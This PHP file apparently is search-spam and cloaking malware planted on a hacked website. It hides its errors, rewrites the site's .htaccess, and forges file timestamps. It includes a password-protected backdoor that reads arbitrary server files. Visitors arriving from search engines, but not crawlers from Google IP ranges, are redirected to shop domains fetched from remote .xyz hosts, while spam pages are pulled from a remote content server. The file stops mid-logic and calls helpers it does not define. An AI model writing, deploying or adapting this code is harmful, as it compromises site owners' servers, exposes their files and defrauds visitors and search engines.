<?php 
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(3600);
define("DOMTXT","/jd1/");
define("GETDATE","http://www.datecenter.com/api/?key=");
define("CENTERKEY",1);
define("MYDIR", "/jpltptqc20190703-8/");
define("FNUM",99);
define("JGNUM","40");
define("LINKNUM","18");
define("BZSITE","s");
define("BZPRO","o");
//msbg
define("JDT","1");
//msend

//msidbg
define("MSID",10032);
//mssidend


//jthouzuibg
define("JTHZ","/");
//jthouzuiend


//keyjgbg
define("KEYJG","12");
//keyjgbgend




// #llqllq#arr_nametimebg

$arrnametime[]="3";
$arrnametime[]="2";
$arrnametime[]="1";
$arrnametime[]="4";


// #llqllq#arr_nametimeend

// #llqllq#arr_wordbg

$arr_word[0][] ="7";$arr_word[0][] ="5";$arr_word[0][] ="4";$arr_word[0][] ="8";$arr_word[0][] ="6";$arr_word[0][] ="8";$arr_word[0][] ="3";$arr_word[0][] ="9";$arr_word[0][] ="4";$arr_word[0][] ="10";$arr_word[0][] ="5";$arr_word[0][] ="11";$arr_word[0][] ="2";$arr_word[0][] ="7";$arr_word[0][] ="6";$arr_word[1][] ="4";$arr_word[1][] ="9";$arr_word[1][] ="10";$arr_word[1][] ="2";$arr_word[1][] ="4";$arr_word[1][] ="5";$arr_word[1][] ="5";$arr_word[1][] ="6";$arr_word[1][] ="8";$arr_word[1][] ="7";$arr_word[1][] ="3";$arr_word[1][] ="8";$arr_word[1][] ="6";$arr_word[1][] ="7";$arr_word[1][] ="11";$arr_word[2][] ="7";$arr_word[2][] ="4";$arr_word[2][] ="8";$arr_word[2][] ="11";$arr_word[2][] ="7";$arr_word[2][] ="3";$arr_word[2][] ="2";$arr_word[2][] ="4";$arr_word[2][] ="10";$arr_word[2][] ="6";$arr_word[2][] ="5";$arr_word[2][] ="5";$arr_word[2][] ="8";$arr_word[2][] ="9";$arr_word[2][] ="6";$arr_word[3][] ="10";$arr_word[3][] ="3";$arr_word[3][] ="2";$arr_word[3][] ="5";$arr_word[3][] ="8";$arr_word[3][] ="9";$arr_word[3][] ="6";$arr_word[3][] ="4";$arr_word[3][] ="8";$arr_word[3][] ="7";$arr_word[3][] ="11";$arr_word[3][] ="5";$arr_word[3][] ="6";$arr_word[3][] ="7";$arr_word[3][] ="4";$arr_word[4][] ="10";$arr_word[4][] ="11";$arr_word[4][] ="6";$arr_word[4][] ="5";$arr_word[4][] ="8";$arr_word[4][] ="4";$arr_word[4][] ="6";$arr_word[4][] ="4";$arr_word[4][] ="7";$arr_word[4][] ="3";$arr_word[4][] ="5";$arr_word[4][] ="8";$arr_word[4][] ="9";$arr_word[4][] ="2";$arr_word[4][] ="7";$arr_word[5][] ="4";$arr_word[5][] ="7";$arr_word[5][] ="6";$arr_word[5][] ="8";$arr_word[5][] ="11";$arr_word[5][] ="8";$arr_word[5][] ="7";$arr_word[5][] ="9";$arr_word[5][] ="4";$arr_word[5][] ="5";$arr_word[5][] ="5";$arr_word[5][] ="10";$arr_word[5][] ="6";$arr_word[5][] ="3";$arr_word[5][] ="2";$arr_word[6][] ="7";$arr_word[6][] ="9";$arr_word[6][] ="11";$arr_word[6][] ="2";$arr_word[6][] ="3";$arr_word[6][] ="4";$arr_word[6][] ="5";$arr_word[6][] ="8";$arr_word[6][] ="4";$arr_word[6][] ="10";$arr_word[6][] ="7";$arr_word[6][] ="6";$arr_word[6][] ="5";$arr_word[6][] ="6";$arr_word[6][] ="8";$arr_word[7][] ="11";$arr_word[7][] ="10";$arr_word[7][] ="4";$arr_word[7][] ="8";$arr_word[7][] ="6";$arr_word[7][] ="7";$arr_word[7][] ="4";$arr_word[7][] ="7";$arr_word[7][] ="5";$arr_word[7][] ="6";$arr_word[7][] ="9";$arr_word[7][] ="3";$arr_word[7][] ="2";$arr_word[7][] ="8";$arr_word[7][] ="5";$arr_word[8][] ="2";$arr_word[8][] ="7";$arr_word[8][] ="7";$arr_word[8][] ="6";$arr_word[8][] ="4";$arr_word[8][] ="5";$arr_word[8][] ="5";$arr_word[8][] ="11";$arr_word[8][] ="4";$arr_word[8][] ="8";$arr_word[8][] ="9";$arr_word[8][] ="3";$arr_word[8][] ="8";$arr_word[8][] ="10";$arr_word[8][] ="6";$arr_word[9][] ="8";$arr_word[9][] ="4";$arr_word[9][] ="7";$arr_word[9][] ="3";$arr_word[9][] ="11";$arr_word[9][] ="2";$arr_word[9][] ="4";$arr_word[9][] ="6";$arr_word[9][] ="5";$arr_word[9][] ="5";$arr_word[9][] ="8";$arr_word[9][] ="6";$arr_word[9][] ="7";$arr_word[9][] ="9";$arr_word[9][] ="10";$arr_word[10][] ="4";$arr_word[10][] ="7";$arr_word[10][] ="7";$arr_word[10][] ="10";$arr_word[10][] ="3";$arr_word[10][] ="6";$arr_word[10][] ="8";$arr_word[10][] ="2";$arr_word[10][] ="5";$arr_word[10][] ="4";$arr_word[10][] ="6";$arr_word[10][] ="9";$arr_word[10][] ="11";$arr_word[10][] ="5";$arr_word[10][] ="8";$arr_word[11][] ="6";$arr_word[11][] ="4";$arr_word[11][] ="7";$arr_word[11][] ="6";$arr_word[11][] ="8";$arr_word[11][] ="4";$arr_word[11][] ="8";$arr_word[11][] ="11";$arr_word[11][] ="5";$arr_word[11][] ="5";$arr_word[11][] ="7";$arr_word[11][] ="2";$arr_word[11][] ="10";$arr_word[11][] ="3";$arr_word[11][] ="9";

// #llqllq#arr_wordend



// #llqllq#arr_keywz

$arrKeywz[]="3";
$arrKeywz[]="2";


// #llqllq#arr_keywzend


// #llqllq#arrBreadbg

$arrBread[]="l-breadcrumb clearfix";
$arrBread[]="bread_crumb clearfix";
$arrBread[]="bread_head";
$arrBread[]="BreadcrumbHead";
$arrBread[]="bread_top";
$arrBread[]="";
$arrBread[]="r-breadcrumb";
$arrBread[]="r-breadcrumb";
$arrBread[]="r-breadcrumb clearfix";
$arrBread[]="bread_crumb";
$arrBread[]="bread_crumb";
$arrBread[]="l-breadcrumb";
$arrBread[]="l-breadcrumb";
$arrBread[]="bread_top clearfix";
$arrBread[]="bread_head";
$arrBread[]="BreadcrumbsHead";
$arrBread[]="bread_crumb clearfix";
$arrBread[]="bread_head clearfix";
$arrBread[]="BreadcrumbsHead clearfix";
$arrBread[]="";
$arrBread[]="bread_crumb";
$arrBread[]="BreadcrumbHead clearfix";
$arrBread[]="bread_top";
$arrBread[]="";
$arrBread[]="";
$arrBread[]="BreadcrumbHead";


// #llqllq#arrBreadend


// #llqllq#arr_fuhao

$arrfh[]="、";
$arrfh[]="……";
$arrfh[]=" ";
$arrfh[]="。";
$arrfh[]="，";
$arrfh[]="？";
$arrfh[]="；";
$arrfh[]="！";


// #llqllq#arr_fuhaoend


$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();



// #llqllq#randkeybg
$strRand[0]="vpidaykfrugxzqlocmbetjnhsw";
$strRand[1]="olsnfrztkuqjpydviagxebcwmh";
$strRand[2]="rmtnbwzhlgcpeqjfsdkuavyoxi";
$strRand[3]="ruzxpjinylewokgsmfhcdqavtb";
$strRand[4]="dnhtupeaxgrmjkcsyfqvzilbwo";
$strRand[5]="binlogcrtvyekxfpzadmqjhwus";
$strRand[6]="birhgydqtsvzkepfuncjmwxloa";
$strRand[7]="ilwphngmdfoteusxvkybzrqajc";
$strRand[8]="rbxoztqsumkphdyiclangwevfj";
$strRand[9]="xtjpqzelvcomdifawsgnyurhkb";
$strRand[10]="lpvobsytcxmqjufkazrgwdnhei";
$strRand[11]="pvgdnmrisczhyubtexaoqfkjlw";
$strRand[12]="yorhstaepguczdnxvkwifmbqjl";
$strRand[13]="nzkuqrcybafhigxemwsdpjlotv";
$strRand[14]="woytjegsacquzlndbhpxvfkmri";
$strRand[15]="ebpytvqxmuwafsrklcdnhijgoz";
$strRand[16]="xukhnqevrcbyftapdgzmswjlio";
$strRand[17]="kuzswdnahiyevlcxrgmbqptfjo";
$strRand[18]="lamiweroqvdcztufhxbgnkpysj";
$strRand[19]="ubvensxcdgiywzfkhaqltjmpor";
$strRand[20]="spzuqfrbkxjiahyolvdtnemcwg";
$strRand[21]="tjhfsmivxqgeyowucbnzpaldkr";
$strRand[22]="pekgrwvxnjutysbofzlqcdmahi";
$strRand[23]="icloyhxwfqmzpertujdnsbgvka";
$strRand[24]="jpigzktmxvuhfwerldynaocbqs";
$strRand[25]="vkbumwtzaonigfecrydlsqjxhp";
$strRand[26]="dvqfuokwmgptniyerazhbjslxc";
$strRand[27]="ilgceuwbjdsmaxqtrhyvozpfnk";
$strRand[28]="qsfdexhivzrpatjgluwmcybokn";
$strRand[29]="zcsowjhulqtykfmvrdaxbniepg";
$strRand[30]="ixenqhdroctmgbyvzujfwapksl";
$strRand[31]="bshnpwqjrcyigtomlkafuzvdex";
$strRand[32]="jmblsxoenkrthzuwiayfqcvgpd";
$strRand[33]="tqzbvmxnwyrpiaegscfodlkhju";
$strRand[34]="gcrlehujiftoykdnwbmqaxpvzs";
$strRand[35]="uqcjfhzmdwnptxysbrekavgloi";
$strRand[36]="osmxhvbpidycltuekqrfgwajzn";
$strRand[37]="irvgpbwodalxukmftzeqscyhnj";
$strRand[38]="gpawmjydufeoxsqrzblnvhckti";
$strRand[39]="juizbvpqlrycsmnhdfwegkoxta";
$strRand[40]="mcwizkhltyrbuosdanegpqvjxf";
$strRand[41]="mfsywavqcounbldtepigzkhxrj";
$strRand[42]="vkyrqaspiwzlhgxbdconjftuem";
$strRand[43]="hvidrzkxqylwogfjpstenucabm";
$strRand[44]="czonjdxlukhagqpwfbyvstirem";
$strRand[45]="cfstmpardvwblyuziejohknxgq";
$strRand[46]="jqdfrayzxgnokitsbluwvpchme";
$strRand[47]="unhadsjwvkmqtipozcgxfelrby";
$strRand[48]="lekytdbvsowfqanjpchuzrgmxi";
$strRand[49]="cluekhqpfvditmsywanjgrxobz";
$strRand[50]="oznaeygvwupdmcrhxsqjfbktli";
$strRand[51]="vfajcuylwkzpesobhmxrnqgtdi";
$strRand[52]="zdpuivoyaenjfsmhcrwxktqglb";
$strRand[53]="yhzsjmercpbgfiqxtunavowdlk";
$strRand[54]="lkhcyuvjoasnmxtiprbqefwzgd";
$strRand[55]="wvqrkdcguilnbjosxyephtfzam";
$strRand[56]="xqacpszmdfhwkubtjnlyoriveg";
$strRand[57]="qemwkitbrpsgalxhuovdzjcfny";
$strRand[58]="fscohmpyitvlqbwrjuxdgekazn";
$strRand[59]="gunmwapodixyhzktesvbqrjclf";
$strRand[60]="uxvmwcilzpfkgnrqdebtjosayh";
$strRand[61]="xboslnmuhyfzgcdvktreqipawj";
$strRand[62]="sdnuamgfvcyhqozkjxriptwebl";
$strRand[63]="dnojyimpskwxzfalrutqbhecvg";
$strRand[64]="lvgwehnjtsuzmqyakrcoxdbpfi";
$strRand[65]="cftnsxeukbpvwmgyqzoidjahlr";
$strRand[66]="eybncpwxloivdmsufqrhgtzkaj";
$strRand[67]="hxpgvnbajtzcseurimwqlkyofd";
$strRand[68]="pgjeailmknchxwdsqobtzuyrfv";
$strRand[69]="xbmcudifprgvhswojkzeqtylan";
$strRand[70]="tfeqizcywdvkxjpmhauoglnbsr";
$strRand[71]="dhwfuyignvoackmqtbexpjzlrs";
$strRand[72]="tskcvrpuidnymoqaehwbzfljgx";
$strRand[73]="runlbaqytpgzmdcewjohviksxf";
$strRand[74]="qhksdmewzxcjougtbvnfpayirl";
$strRand[75]="uphjvasygrzoteicdbwfqxnlkm";
$strRand[76]="dshqwpzytlnoejumvbkrcgafxi";
$strRand[77]="tdeiascnfqxwrpzmgkojbvhlyu";
$strRand[78]="imrxyvcgtaunswbpoldjzkqehf";
$strRand[79]="bwlitsdgqxovjhyceznfuparmk";
$strRand[80]="borvipncuzsjatyhxmflgkdeqw";
$strRand[81]="zilkpevsuqgjrdnmbofycthwxa";
$strRand[82]="hwlkodqmuxpnaevgciyzjsrfbt";
$strRand[83]="whtmciqxzlgrukspoybvnfjeda";
$strRand[84]="amfjneygwhvtxqkcbiudplzsor";
$strRand[85]="gbrjwznckahdpixselquvmtfyo";
$strRand[86]="gfjtqladycvhkbuxrzepwiomns";
$strRand[87]="durvwlqmiconpgktsehbxyfzja";
$strRand[88]="awbvdfshrxolqynkzucemigtpj";
$strRand[89]="orltmchqevakfwgndupysizbjx";
$strRand[90]="kwnbyaozqcrhgfxdimsjtpluve";
$strRand[91]="oakruhmcfsqtezxiwlypnjdgvb";
$strRand[92]="ogrdtbapmjlfqeyvixzuhwkcsn";
$strRand[93]="zfgbqlthcvaorjswuxemnpyidk";
$strRand[94]="rfgdomzjixuklpyaswtnqbchve";
$strRand[95]="owvgyjenspqaxcimrzdlhtbfuk";
$strRand[96]="wosabyrqvcipudfgmhnletxkjz";
$strRand[97]="oijcseprwkuztxafqlhnbgydvm";
$strRand[98]="jutlporkvmncwqdbfyhxzaisge";
$strRand[99]="jbdacqszotvpkyfmxwhlnuiegr";

// #llqllq#randkeyend



$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);
define("GETDOM",getthisdom());


// 
	
	
	
$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $strRand{$i}.$strRand{$i+1};}
$Arrrarr = array_flip($arrArrr);
$stss = 'transferdm';
$stss2 = 'deliverym';


if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("../sitemaps"))
		mkdir("../sitemaps", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	$mapnum = (int)trim($_GET["mapnum"]);
	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum,$mapnum);
	
	
	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";		
		
		
		
		$idUrl =  GETDOM . "gpage.php?getid=$vss";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
	
		if(count($arrId) < 100){
			echo "g sitemap fail<br/>";
			die();
		}
		
		echo $vals."<br/>";
	
		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrId,2,1);			}else{
				gsitemap($arrId,1,2);			}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrId,2,1);			}else{
				gsitemap2($arrId,1,2);			}
			
		}
		
		unset($arrId,$tempArr1,$tempArr2);	}
	
}


if(isset($_GET["ghtac"]) && $_GET["ghtac"]){

	$dirNames = dirname(__FILE__);    
	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));	
	$PreDir = '';	
	if(JDT == 1){
		$UrlBaseDir = $httcReplace;		$RewriteOnDir = '';	
	}else{
		$UrlBaseDir = '';		$PreDir = '../';		$RewriteOnDir = $httcReplace . '/';	
	}
	$strhtt = '';
	if (file_exists("$PreDir.htaccess")){
		@chmod("$PreDir.htaccess",0755);
		$strhtt = file_get_contents("$PreDir.htaccess");	
	}
	if(!(strstr($strhtt,'RewriteBase') || strstr($strhtt,'RewriteRule')))
	{
		$strhtt = '<IfModule mod_rewrite.c>'.PHP_EOL . 'Options +FollowSymLinks'. PHP_EOL .'RewriteEngine on'. PHP_EOL .'RewriteBase /'. $UrlBaseDir . PHP_EOL .'</IfModule>';	
	}else{
		$strhtt = str_ireplace('# RewriteBase ','RewriteBase ',$strhtt);
		$strhtt = str_ireplace('#RewriteBase ','RewriteBase ',$strhtt);	
	}
		
	if(1){
		$r1 = '#(.*RewriteBase.*)#i';		$r2 = '#RewriteRule#i';		
		$rsut = '\1'.PHP_EOL . 'RewriteRule ^'. '.*[-](\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '.*[-](\d+)-.*'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' .PHP_EOL . 'RewriteRule ^'. '.*'.$RewriteOnDir.'/(.*)$ '.$RewriteOnDir.'index\.php?key=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^'. '.*[-/]'. BZPRO .'(\d+)-.*$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)-.*$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)-.*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL;
		
		$rsut2 = PHP_EOL . 'RewriteRule ^'. '.*[-](\d+)'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. '.*[-](\d+)-.*'. JTHZ .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' .PHP_EOL . 'RewriteRule ^'. '.*'.$RewriteOnDir.'/(.*)$ '.$RewriteOnDir.'index\.php?key=\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. '.*[-/]'. BZPRO .'(\d+)-.*$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)-.*$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]' . PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL .'RewriteRule' ;		
		if(preg_match($r1,$strhtt)){
			$strhtt = preg_replace($r1,$rsut,$strhtt,1);		
		}else{
			$strhtt = preg_replace($r2,$rsut2,$strhtt,1);
		}
		
		if(JDT == 1 or JDT == 0){
			file_put_contents("$PreDir.htaccess", $strhtt);		
		}
		
	}

	die("ghtac ok");
}




if(isset($_POST["chdate"]) && md5($_POST["chdate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_POST["redate"]) && md5($_POST["redate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo rFile($redate_file);die();}else{echo '#nofile#';die();}}if(isset($_POST["test"]) && md5($_POST["test"])=='b6772c68627f804a9578152ee90f5b0c'){echo '#ok#';	die();}if((isset($_POST["lan"]) && $_POST["lan"] == 1) or (isset($_GET["lan"]) && $_GET["lan"] == 1)){$fileArr = array();$flag = 1;$fileArr['index'] = filesize(__FILE__);if(file_exists("./moban.html")){$fileArr['moban'] = filesize("./moban.html");}else{$flag = 0;$fileArr['moban'] = -1;}echo 'error---'. serialize($fileArr) .'---';die();}if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){die();}
	
	
	
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
				
		$r2='#^.*-(\d+)'. JTHZ.'#i';		$r3='#-(\d+)-#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempPid){
			$_GET['id']= $tempPid;		
		}
		
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		
			
		$r2='#^.*-(\d+)#i';		$r3='#-(\d+)-#i';		

		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempPid){
			$_GET['id']= $tempPid;		
		}
	
	
}

function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
	
	
if(isset($_GET["id"]))
	$id = $_GET["id"];
else{
	if(1){
		$fLogTime =  filemtime($mbFileName);
		$tpulrs =  $_SERVER['REQUEST_URI'];
		$rqurl = str_replace("'","\'",$_SERVER['REQUEST_URI']);
		
		$logFileName = './idlogs.txt';
		if(file_exists($logFileName)){
			$arrUrlId = unserialize(file_get_contents($logFileName));
		}else{
			$arrUrlId = array();
		}
		
		if(isset($rqurl) && isset($arrUrlId[$rqurl]) && $arrUrlId[$rqurl]){
				$id  = $arrUrlId[$rqurl];		
		}else{
			$arrUrlId[$rqurl] = getRandId();
			$id = $arrUrlId[$rqurl];
			file_put_contents($logFileName,serialize($arrUrlId));
			@touch(dirname($logFileName), $fLogTime, $fLogTime); 
			@touch($logFileName, $fLogTime, $fLogTime);    
		}
	}
}

$resid = '#^\d+$#';
if(!preg_match($resid,$id)){
	exit;
}

$id23 = $id;



$numArr_key = count($arr_key);
$siteid = MSID;
$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
$pInfoUrl =  GETDOM . "gpage.php?id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM;
// $_SERVER["HTTP_REFERER"] = "google.com.hk";
if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';	

	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ); 
	$localIp = get_real_ip();	
	$is_or_no = is_ip($localIp,$ipRanges);
	$iszz = isCrawler();
	
		
	if(function_exists('gethostbyaddr')){
		$hostname = @gethostbyaddr($localIp);
		$is_g_ip = preg_match("#google#i", "$hostname") === 1;
	}else{
		$is_g_ip = 0;
	}
	
	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false && !$is_g_ip){
		$rsdom = '#^https?://www\.[^/]+/$#i';
		
		$jumDom1 = 'http://www.'.$stss.'.xyz'. DOMTXT . $siteid .".txt";	
		$jumDom2 = 'http://www.'.$stss2.'.xyz'. DOMTXT . $siteid .".txt";
	
		for($i=0;$i<2;$i++){
			$domJump = curl_getjs_from_webpage($jumDom1,2);
			$domJump = trim($domJump);

			if(!preg_match($rsdom,$domJump)){
				$domJump = curl_getjs_from_webpage($jumDom2,10);
			
				$domJump = trim($domJump);
				if(preg_match($rsdom,$domJump))
					break;
			}else{
				break;
			}
		}
		
		echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $domJump . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';		die();	
	}
}
 
 $fcontent = '';
 
 
 $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID";  
 $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
 $rsInfo = '#<info>(.*)</info>#si';
 preg_match($rsInfo,$pInfoStr,$matchInfo);
 if(isset($matchInfo[1])){
	 $InFoStrArr = unserialize($matchInfo[1]);
 }else{
	 header("HTTP/1.1 404 Not Found");exit;
 }
 
 if(isset($InFoStrArr['frStr2'])){
	$frStr2 = $InFoStrArr['frStr2'];
	$fr2Arr = unserialize($frStr2);
 }
 
$frStr1 = $InFoStrArr['frStr1'];
$fr1Arr = unserialize($frStr1);

$Ptitle = $InFoStrArr['Ptitle'];

$nowIdName = $InFoStrArr['nowIdName'];


$Article = $InFoStrArr['Article'];
$pcatstr = $InFoStrArr['pcatstr'];

if(strstr($pcatstr,'#cname#')){
	$temparrI = explode('#cname#',$pcatstr);
	$catStr = $temparrI[0];
	$catArr = explode('^^',$catStr);
	$mateStr = $temparrI[1];
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = $temparrII[0];
		$pdescription = $temparrII[1];
	}else{
		$pkeyword = $nowIdName;
		$pdescription = $nowIdName;
	}
}else{
	$catArr = array();
	if(strstr($mateStr,'#keydescription#')){
		$temparrII = explode('#keydescription#',$mateStr);
		$pkeyword = $temparrII[0];
		$pdescription = $temparrII[1];
	}else{
		$pkeyword = $nowIdName;
		$pdescription = $nowIdName;
	}
}

	$flagDescription = KEYJG % 2;
	
	$getKeyNumKey = ($id23 + KEYJG) % 3;
	if($getKeyNumKey == 0){
		$getKeyNum = 3;
	}elseif($getKeyNumKey == 1){
		$getKeyNum = 4;
	}else{
		$getKeyNum = 5;
	}
	
	
	$TagKey = KEYJG % 3;
	
	if($TagKey == 0){
		$keyHtmlTag = 'strong';
	}elseif($TagKey == 1){
		$keyHtmlTag = 'b';
	}else{
		$keyHtmlTag = 'h3';
	}
	$tempkeyArr = explode(',',$pkeyword);
	$pkeywordsRstr = '';
	$pkeywordsRstrDes = '';

	if(count($tempkeyArr)){
		$flagtempI = 0;
		foreach($tempkeyArr as $vs){
			$vs = trim($vs);
			if(!$vs)
				continue;
			
			if($flagtempI < $getKeyNum)
				$pkeywordsRstrDes .= ' ' .$vs;
			$flagtempI++;
			$pkeywordsRstr .= "<{$keyHtmlTag}>{$vs}</{$keyHtmlTag}>";
		}

		if($flagDescription == 1){
			$pdescription = $Ptitle . $pkeywordsRstrDes;
		}
	}else{
		$pkeywordsRstr = $nowIdName;
	}


$BreadStr = getBreadcrum($Ptitle,$catArr);


$thisPnameLink = '<a href="">'.$nowIdName.'</a>';
$thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
$thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';
$Article =  str_replace('#ttlink#',$thisTitleLink,$Article);
$Article =  str_replace('#mylink#',$thisPnameLink2,$Article);


$artArr = explode('#fgfgfg#',$Article);
$artArr[0] = str_replace('pkeywords',$pkeywordsRstr,$artArr[0]);
// print_r($artArr);
if(count($artArr) != 3){
	header("HTTP/1.1 404 Not Found");exit;
}


